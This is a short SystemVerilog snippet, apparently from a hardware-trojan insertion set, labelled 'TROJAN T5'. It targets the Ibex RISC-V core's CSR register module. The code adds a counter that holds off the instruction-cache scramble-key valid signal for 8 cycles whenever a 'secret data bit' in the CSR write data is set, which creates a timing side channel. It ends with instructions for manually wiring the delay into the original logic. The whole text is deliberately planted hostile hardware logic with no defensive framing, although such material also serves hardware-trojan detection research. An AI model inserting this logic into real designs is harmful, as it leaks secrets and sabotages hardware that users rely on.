
// ========== TROJAN T5: Performance Degradation ==========
// Custom
// Module: ibex_cs_registers
// Type: Sequential
// Description: Adds artificial delay to ic_scr_key_valid_i

// Trojan delay counter
logic [3:0] trojan_T5_delay_counter;

// Trojan logic
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        trojan_T5_delay_counter <= 4'h0;
    end else begin
        if (csr_wdata_i) begin
            // Add delay cycles based on secret bit
            if (csr_wdata_i[0]) begin  // Secret data bit
                trojan_T5_delay_counter <= 4'h8;  // 8 cycle delay
            end else begin
                trojan_T5_delay_counter <= 4'h0;  // No delay
            end
        end else if (trojan_T5_delay_counter > 0) begin
            trojan_T5_delay_counter <= trojan_T5_delay_counter - 1'b1;
        end
    end
end

// MANUAL INSERTION REQUIRED:
// Modify ic_scr_key_valid_i assignment:
//   assign ic_scr_key_valid_i = (trojan_T5_delay_counter == 0) ? <original_logic> : 1'b0;

// ========== TROJAN T5 END ==========
